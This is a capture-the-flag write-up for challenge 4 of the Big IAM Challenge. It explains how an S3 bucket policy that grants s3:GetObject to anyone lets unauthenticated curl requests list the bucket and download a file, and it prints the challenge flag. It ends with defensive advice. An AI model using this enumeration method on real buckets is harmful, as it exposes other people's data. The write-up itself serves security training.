# Writeup for Big IAM Challenge: Challenge 4

Challenge Number
4

Challenge Statement
The goal of Challenge 4 is to exploit an overly permissive IAM policy on an Amazon S3 bucket. Although the challenge claims that only a specific admin user can access the bucket, the policy contains a flaw that allows unauthorized users to list and retrieve objects. This challenge highlights the risks of misconfigured S3 bucket permissions.

## IAM Policy

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

### Short analysis about the IAM policy

```
What do I have access to?

The policy allows anyone (Principal: "*") to retrieve objects from the bucket using s3:GetObject.
The policy also allows anyone to list the bucket’s contents using s3:ListBucket, but only under the condition that:
The prefix of the object starts with files/.
The requester’s AWS IAM ARN matches arn:aws:iam::133713371337:user/admin.
What don’t I have access to?

The policy intends to restrict s3:ListBucket to only the admin user using the aws:PrincipalArn condition. However, there are no such restrictions on s3:GetObject, which allows anyone to retrieve objects if they know the file names.
What do I find interesting?

Even though listing files is restricted, object retrieval is completely open due to the lack of conditions on s3:GetObject.
If I can guess or infer file names, I can directly download files from the bucket.
```

## Solution

Step 1: Attempt to List Files
I first attempted to list the files in the bucket using a cURL request:

```
curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"
```

The response contained a list of objects in XML format:
 ```
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
    <Name>thebigiamchallenge-admin-storage-abf1321</Name>
    <Prefix>files/</Prefix>
    <Contents>
        <Key>files/flag-as-admin.txt</Key>
        <LastModified>2023-06-07T19:15:43.000Z</LastModified>
        <ETag>"e365cfa7365164c05d7a9c209c4d8514"</ETag>
        <Size>42</Size>
        <StorageClass>STANDARD</StorageClass>
    </Contents>
    <Contents>
        <Key>files/logo-admin.png</Key>
        <LastModified>2023-06-08T19:20:01.000Z</LastModified>
        <ETag>"c57e95e6d6c138818bf38daac6216356"</ETag>
        <Size>81889</Size>
        <StorageClass>STANDARD</StorageClass>
    </Contents>
</ListBucketResult>

 ```

Step 2: Retrieve the Flag File
With the file name files/flag-as-admin.txt discovered, I downloaded it using another cURL request:

```
curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt"

```

The response contained the flag:

```
{wiz:principal-arn-is-not-what-you-think}
```

### Step 3: Submitted the Flag

Finally, I inserted the flag found in the "Insert flag here" textbox and was redirected to the success screen.

## Reflection

- **What was your approach?**
 I identified a flaw in the IAM policy where s3:GetObject had no restrictions, allowing me to directly download files once I knew their 
 names. Using the ability to list the bucket's contents, I was able to enumerate the filenames, making it easy to retrieve the flag.
 
- **What was the biggest challenge?**
 The policy appeared to restrict access to admin users, but in reality, public access was unintentionally granted due to the missing 
 conditions on s3:GetObject.
 
- **How did you overcome the challenges?**
 I realized that the lack of restrictions on s3:GetObject made it possible to directly download files from the bucket if I could enumerate 
 them. By listing the files with the s3:ListBucket action, I was able to retrieve the flag.
 
- **What led to the breakthrough?**
 Discovering that the s3:ListBucket was still accessible despite the restriction.
 Realizing that even if listing was blocked, guessing filenames like flag-as-admin.txt would still work because object retrieval was 
 unrestricted.

**On the Blue Side: Defensive Measures**  
  - Restrict the Principal: Replace Principal: "*" with specific AWS roles or accounts to prevent unauthorized access.
  - Add conditions to s3:GetObject: Ensure that the same conditions used for s3:ListBucket apply to s3:GetObject.
  - Block public access at the bucket level: Use AWS S3’s Block Public Access feature to prevent unintended public exposure.
  - Enable access logging: Monitor requests to identify unexpected access patterns.
  - Use signed URLs for access: Instead of allowing unrestricted s3:GetObject access, require temporary signed URLs that expire after a 
    short period.
  - Regularly audit bucket policies: Continuously review and test IAM policies to prevent misconfigurations.

This challenge highlights how misconfigured IAM policies can lead to unintended public access. Even though listing was restricted, allowing open object retrieval still exposed sensitive files. Proper IAM policy configurations are essential for securing AWS resources.
